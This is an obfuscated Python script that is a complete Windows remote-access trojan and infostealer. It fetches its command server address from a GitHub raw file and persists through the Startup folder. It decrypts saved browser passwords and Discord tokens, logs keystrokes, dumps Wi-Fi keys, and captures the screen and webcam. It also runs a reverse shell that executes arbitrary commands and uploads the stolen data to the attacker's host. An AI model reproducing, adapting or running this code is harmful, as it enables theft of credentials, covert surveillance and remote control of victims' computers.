import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
kIHDMUYxIPpQRTj = ""
vTengKfYnYhcAm = ""
nKCjDVZFsbsPAplBfMsQ = "04.06.25.1"
TDGtnxFFGDgYQZgUkglQdd = True
yoQcBPneGETrKK = "!"
OVqHhmqmumPWzG = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
nCyMIIgmzNPbAizCbgP = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
VEnMozHLX = os.path.expanduser("~\\AppData\\Local\\")
DJUGDENhjsNdCwHByImXnmT = os.path.expanduser("~\\AppData\\Roaming\\")
XFqiZHhYKeWTjxNnheJh = ""
WdUKDKjqsaculafVCC = {
	'chrome':VEnMozHLX+'Google\\Chrome\\User Data','chromium':VEnMozHLX+'Chromium\\User Data','chrome-canary':VEnMozHLX+'Google\\Chrome SxS\\User Data',
	'msedge':VEnMozHLX+'Microsoft\\Edge\\User Data','msedge-canary':VEnMozHLX+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':VEnMozHLX+'Microsoft\\Edge Beta\\User Data','msedge-dev':VEnMozHLX+'Microsoft\\Edge Dev\\User Data',
	'avast':VEnMozHLX+'AVAST Software\\Browser\\User Data','amigo':VEnMozHLX+'Amigo\\User Data',
	'torch':VEnMozHLX+'Torch\\User Data','kometa':VEnMozHLX+'Kometa\\User Data','orbitum':VEnMozHLX+'Orbitum\\User Data',
	'cent-browser':VEnMozHLX+'CentBrowser\\User Data','7star':VEnMozHLX+'7Star\\7Star\\User Data',
	'sputnik':VEnMozHLX+'Sputnik\\Sputnik\\User Data','vivaldi':VEnMozHLX+'Vivaldi\\User Data',
	'epic-privacy-browser':VEnMozHLX+'Epic Privacy Browser\\User Data','uran':VEnMozHLX+'uCozMedia\\Uran\\User Data',
	'yandex':VEnMozHLX+'Yandex\\YandexBrowser\\User Data','brave':VEnMozHLX+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':VEnMozHLX+'Iridium\\User Data','coccoc':VEnMozHLX+'CocCoc\\Browser\\User Data',
	'opera':DJUGDENhjsNdCwHByImXnmT+'Opera Software\\Opera Stable','opera-gx':DJUGDENhjsNdCwHByImXnmT+'Opera Software\\Opera GX Stable'
}
def jLqGgqKNO(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def iodjZnGEjh(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	tibUiiilkLzv = data.decode("utf-8").replace("\n","")
	if not tibUiiilkLzv.startswith(yoQcBPneGETrKK):
		proc = subprocess.run(tibUiiilkLzv, shell=True, capture_output=True)
		ayodjxY = proc.stdout + proc.stderr
		qGZNFOFj(s, ayodjxY)
		return
	xlLDMgIP = tibUiiilkLzv.split(" ")[0][1:]
	args = " ".join(tibUiiilkLzv.split()[1:]).split()
	if xlLDMgIP == "download":
		RsHkQGOCALEPHBkKgNdS(s, tibUiiilkLzv)
	elif xlLDMgIP == "screenshot":
		NYRdjqZBF(s)
	elif xlLDMgIP == "basename":
		qGZNFOFj(s, os.path.basename(__file__))
	elif xlLDMgIP == "update":
		YzjtGMkpC(s)
	elif xlLDMgIP == "wifi":
		jbFudsqpPKEkZfOQflA(s)
	elif xlLDMgIP == "screenrecord":
		mfNBUOBHeq(s, args)
	elif xlLDMgIP == "browsers":
		ktHSvtCwDfTqh(s)
	elif xlLDMgIP == "webcam":
		webCam(s, args)
	elif xlLDMgIP == "cd":
		moveDirectory(s, tibUiiilkLzv[4:])
	else:
		qGZNFOFj(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		qGZNFOFj(s,"")
	except:
		qGZNFOFj(s, "[!] 404")
def RsHkQGOCALEPHBkKgNdS(s, tibUiiilkLzv):
	BbGreBhrXmQaQOpcWtfo = tibUiiilkLzv.replace(yoQcBPneGETrKK+"download ","").split(",")
	ayodjxYs = ""
	for f in BbGreBhrXmQaQOpcWtfo:
		ayodjxYs += qjjKvrsVGgMi(f, "api/file/", { "type":os.path.splitext(f)[1] })
	qGZNFOFj(s, ayodjxYs)
def NYRdjqZBF(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	GTNshXtTlTtZnZa = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(GTNshXtTlTtZnZa)
	image.close()
	ayodjxY = qjjKvrsVGgMi(GTNshXtTlTtZnZa, "api/sscap")
	os.remove(GTNshXtTlTtZnZa)
	qGZNFOFj(s, ayodjxY)
def webCam(s, args):
	import cv2
	cameraNumber = 0
	fname = "wc.jpg"
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = cv2.VideoCapture(cameraNumber)
		_, frame = cam.read()
		cv2.imwrite(VEnMozHLX+fname, frame)
		cam.release()
		r=qjjKvrsVGgMi(VEnMozHLX+fname,"api/wc")
		os.remove(VEnMozHLX+fname)
		qGZNFOFj(s, r)
	except Exception as e:
		qGZNFOFj(s, "[!] 404: "+str(e))
def mfNBUOBHeq(s, args):
	import imageio
	from PIL import ImageGrab
	sDKotyNEcZyVJPitVskOPw = 15
	if not args == []:
		try: sDKotyNEcZyVJPitVskOPw = int(args[0])
		except: pass
	xKExsMyWuAjdpXJBijS = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	SPgSqObrHDohtwGAUW = []
	fps = 11
	numFrames = sDKotyNEcZyVJPitVskOPw * fps
	for _ in range(numFrames):
		SPgSqObrHDohtwGAUW.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(xKExsMyWuAjdpXJBijS, SPgSqObrHDohtwGAUW, fps=fps, quality=8)
	r=qjjKvrsVGgMi(xKExsMyWuAjdpXJBijS, "api/screc")
	os.remove(xKExsMyWuAjdpXJBijS)
	qGZNFOFj(s, r)
def qjjKvrsVGgMi(fCgRfapxT, JzykwxcsgeqGPOhY, zpssKKN=None):
	import requests
	if not os.path.isfile(fCgRfapxT):
		return "[!] 404: "+fCgRfapxT+"\n"
	headers = {"user":os.getlogin()}
	if zpssKKN is not None:
		headers = {**headers, **zpssKKN}
	f = open(fCgRfapxT, "rb")
	requests.post("http://"+kIHDMUYxIPpQRTj+":5555/"+JzykwxcsgeqGPOhY,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def fGyAbosDXtToLoSkG(BlLhMdLoVVzeHDKUyCwxc, JzykwxcsgeqGPOhY):
	import requests
	if BlLhMdLoVVzeHDKUyCwxc.strip() == "":
		return "[!] 204"
	requests.post("http://"+kIHDMUYxIPpQRTj+":5555/"+JzykwxcsgeqGPOhY,
		data=BlLhMdLoVVzeHDKUyCwxc,
		headers={"user":os.getlogin()})
	return "[+] 200"
def YzjtGMkpC(s):
	h, p, v = GReEoOgCbdEsVVuc(True)
	if (v != nKCjDVZFsbsPAplBfMsQ):
		syvUjYkoZNYrmdWjQpJ(v)
		qGZNFOFj(s, "[+] 200")
	else:
		qGZNFOFj(s, "[-] 304")
def jbFudsqpPKEkZfOQflA(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		qGZNFOFj(s, "[!] 500")
		return
	NEyiWdilsj = ""
	for p in profiles:
		try: NEyiWdilsj+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: NEyiWdilsj+=f"    {p} - N/A"
	qGZNFOFj(s, NEyiWdilsj)
def syvUjYkoZNYrmdWjQpJ(bsTCcnJRvFRbYKimXa):
	import requests
	global TDGtnxFFGDgYQZgUkglQdd
	sjBQybClcAt = os.path.basename(__file__)
	fileType = sjBQybClcAt.split(".")[-1]
	MaZxrwofSOwYXgaCHuC = sjBQybClcAt.split(".")[0]+"."+bsTCcnJRvFRbYKimXa+".pyw" if fileType.startswith("py") else ".exe"
	snwyMGyXOkRsiTQRLhuh = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), MaZxrwofSOwYXgaCHuC)
	if not os.path.isfile(snwyMGyXOkRsiTQRLhuh):
		with open(snwyMGyXOkRsiTQRLhuh, "w+") as f:
			f.write(requests.get(nCyMIIgmzNPbAizCbgP+"file."+ "pyw" if snwyMGyXOkRsiTQRLhuh.split(".")[-1].startswith("py") else "exe").text)
	else:
		TDGtnxFFGDgYQZgUkglQdd = False
def GReEoOgCbdEsVVuc(force=False):
	global kIHDMUYxIPpQRTj, vTengKfYnYhcAm
	if force or kIHDMUYxIPpQRTj == "" or vTengKfYnYhcAm == "":
		while True:
			try:
				with urllib.request.urlopen(OVqHhmqmumPWzG) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					kIHDMUYxIPpQRTj = data[0].strip()
					vTengKfYnYhcAm = data[1].strip()
					bsTCcnJRvFRbYKimXa = data[2].strip()
					return kIHDMUYxIPpQRTj, vTengKfYnYhcAm, bsTCcnJRvFRbYKimXa
			except:
				time.sleep(10)
def HqkkxiesJcZXrp():
	try:
		AheYjDHLXyxCAKigIePy = "settings.xpb"
		ItDKYCpezEVWULG = sorted([file for file in os.listdir(VEnMozHLX) if os.path.isfile(VEnMozHLX+"\\"+file) and file.endswith(AheYjDHLXyxCAKigIePy.split(".")[-1])])
		if AheYjDHLXyxCAKigIePy in ItDKYCpezEVWULG:
			ItDKYCpezEVWULG.remove(AheYjDHLXyxCAKigIePy)
		DnGnDamBCRiHUaeTRfZHEm = os.path.join(VEnMozHLX,AheYjDHLXyxCAKigIePy)
		if len(ItDKYCpezEVWULG) > 0:
			with open(DnGnDamBCRiHUaeTRfZHEm, "ab+") as f:
				for file in ItDKYCpezEVWULG:
					temp = os.path.join(VEnMozHLX,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		qjjKvrsVGgMi(DnGnDamBCRiHUaeTRfZHEm, "api/log")
		if os.path.isfile(DnGnDamBCRiHUaeTRfZHEm):
			os.remove(DnGnDamBCRiHUaeTRfZHEm)
	except:
		pass
def TxaNrmKGxiuDBIjsD():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(VEnMozHLX+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def LAwhkHFVmnRde(k):
		logging.info(str(k))
	k=Listener(on_press=LAwhkHFVmnRde)
	WCXTntx = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in WCXTntx:
		l.setLevel(logging.CRITICAL)
	k.start()
def ktHSvtCwDfTqh(s, upload=False):
        import requests,sqlite3,win32crypt
        from Cryptodome.Cipher import AES
        WotcJOozqBSszLHO = "\n"
        for browser in WdUKDKjqsaculafVCC:
                path = WdUKDKjqsaculafVCC[browser]
                kPgRhNrsJYhppWCQIGOfYyh = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        kPgRhNrsJYhppWCQIGOfYyh = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", VEnMozHLX+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(VEnMozHLX+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        WotcJOozqBSszLHO += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(kPgRhNrsJYhppWCQIGOfYyh, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                WotcJOozqBSszLHO += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(VEnMozHLX+"\\db.db")
        HkfjMOkJymNeMwwEye = []
        discordPaths = [DJUGDENhjsNdCwHByImXnmT+'\\discord\\Local Storage\\leveldb\\',DJUGDENhjsNdCwHByImXnmT+'\\discordcanary\\Local Storage\\leveldb\\',DJUGDENhjsNdCwHByImXnmT+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                kPgRhNrsJYhppWCQIGOfYyh = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        kPgRhNrsJYhppWCQIGOfYyh = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(kPgRhNrsJYhppWCQIGOfYyh, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in HkfjMOkJymNeMwwEye:
                                                HkfjMOkJymNeMwwEye.append(decryptedToken)
        FRIWRSxxCVS = "https://discord.com/api/v9/users/@me"
        if HkfjMOkJymNeMwwEye: WotcJOozqBSszLHO +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for CMyEzsP in HkfjMOkJymNeMwwEye:
                headers = {"Content-Type":"application/json","Authorization":CMyEzsP,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(FRIWRSxxCVS, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(FRIWRSxxCVS+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(FRIWRSxxCVS+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                WotcJOozqBSszLHO += f"\n{user}\n{'-'*len(user)}\nToken: {CMyEzsP}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        WotcJOozqBSszLHO += "\n\n"
        if not upload:
                qGZNFOFj(s, WotcJOozqBSszLHO)
        else:
                fGyAbosDXtToLoSkG(WotcJOozqBSszLHO, "api/google")
def qGZNFOFj(clientSocket, BlLhMdLoVVzeHDKUyCwxc):
	formattedData = b""
	if type(BlLhMdLoVVzeHDKUyCwxc) == bytes:
		formattedData += BlLhMdLoVVzeHDKUyCwxc
	else:
		formattedData += bytes(BlLhMdLoVVzeHDKUyCwxc, "utf-8")
	formattedData += bytes("\n"+XFqiZHhYKeWTjxNnheJh+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def WNMxhaOH():
	global XFqiZHhYKeWTjxNnheJh
	h, p, v = GReEoOgCbdEsVVuc()
	try: HqkkxiesJcZXrp()
	except: pass
	try:
		if nKCjDVZFsbsPAplBfMsQ != v:
			syvUjYkoZNYrmdWjQpJ(v)
	except: pass
	try:
		if TDGtnxFFGDgYQZgUkglQdd:
			ktHSvtCwDfTqh(None,True)
	except: pass
	try:
		if TDGtnxFFGDgYQZgUkglQdd:
			TxaNrmKGxiuDBIjsD()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	XFqiZHhYKeWTjxNnheJh = ("(old)"if nKCjDVZFsbsPAplBfMsQ!=v else "")+"["+nKCjDVZFsbsPAplBfMsQ+"] "+os.getlogin()+" - "
	while True:
		kEjBKrG=False
		try:
			s=jLqGgqKNO(h, p)
			qGZNFOFj(s, "")
			while not kEjBKrG:
				try: kEjBKrG=iodjZnGEjh(s)
				except Exception as e:
					qGZNFOFj(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
WNMxhaOH()
